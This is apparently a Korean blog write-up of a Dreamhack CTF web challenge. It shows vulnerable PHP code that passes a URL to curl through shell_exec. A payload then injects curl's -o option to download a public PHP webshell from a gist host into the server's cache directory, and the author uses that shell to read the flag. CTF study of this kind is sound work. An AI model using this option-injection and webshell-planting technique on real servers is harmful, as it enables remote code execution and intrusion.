---
title: (11) Dreamhack Command Injection Advanced 문제 풀이
date: 2024-01-14 +09:00
categories:
  - 웹해킹
tags:
  - [웹해킹, 드림핵]
---
{% raw %}
## 문제 풀이
![](http://localhost:4000/assets/img/post/11/1.png)
들어오면 이런 사이트가 뜹니다.  
  
일단 index.php 코드부터 보겠습니다.
```php
<html>
    <head></head>
    <link rel="stylesheet" href="/static/bulma.min.css" />
    <body>
        <div class="container card">
        <div class="card-content">
        <h1 class="title">Online Curl Request</h1>
    <?php
        if(isset($_GET['url'])){
            $url = $_GET['url'];
            if(strpos($url, 'http') !== 0 ){
                die('http only !');
            }else{
                $result = shell_exec('curl '. escapeshellcmd($_GET['url']));
                $cache_file = './cache/'.md5($url);
                file_put_contents($cache_file, $result);
                echo "<p>cache file: <a href='{$cache_file}'>{$cache_file}</a></p>";
                echo '<pre>'. htmlentities($result) .'</pre>';
                return;
            }
        }else{
        ?>
            <form>
                <div class="field">
                    <label class="label">URL</label>
                    <input class="input" type="text" placeholder="url" name="url" required>
                </div>
                <div class="control">
                    <input class="button is-success" type="submit" value="submit">
                </div>
            </form>
        <?php
        }
    ?>
        </div>
        </div>
    </body>
</html>
```
curl 요청을 보내고 결과를 cache 파일로 저장해준다고 합니다. url은 http로 시작해야 하고요.  
  
php에, 외부 파일을 다운 받을 수 있는 조건? 저는 바로 웹쉘이 떠올랐습니다. 일단 php 웹쉘 부터 구해야 겠죠?  
구글에 php webshell 만 검색하면 아주 많이 나올텐데 저는 맨 위에 있는 [웹쉘](https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/50008b4501ccb7f804a61bc2e1a3d1df1cb403c4/easy-simple-php-webshell.php)을 사용했습니다.
  
저는 curl을 자주 사용해서 익숙한데, 안써보신 분들을 위해 알려드리자면,
curl은 다양한 프로토콜로 데이터를 송수신하기 위한 프로그램으로 당연히 http(s) 같은 웹 프로토콜도 지원합니다. 이를 활용해 파일을 다운받을 수도 있습니다. curl에는 몇가지 옵션이 있는데, 그중 하나인 `-o`옵션은 요청 결과를 원하는 위치에 저장이 가능합니다.  
  
딱히 필터링이 없으므로 아무거나 적을 수 있습니다.
```
https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/50008b4501ccb7f804a61bc2e1a3d1df1cb403c4/easy-simple-php-webshell.php -o /var/www/html/cache/shell.php
```
저는 다음과 같이 적었습니다.
![](http://localhost:4000/assets/img/post/11/2.png)
우리는 cache의 shell.php로 접속하면 되므로 cache file은 필요없고 그냥 `/cache/shell.php`로 접속합니다.
![](http://localhost:4000/assets/img/post/11/3.png)
웹쉘 화면이 잘 나오는군요. 이젠 flag를 찾기만 하면 됩니다. 찾아보면 그냥 /에 있습니다.
![](http://localhost:4000/assets/img/post/11/4.png)
저 flag 파일을 실행해주면
![](http://localhost:4000/assets/img/post/11/5.png)
flag가 나옵니다.
{% endraw %}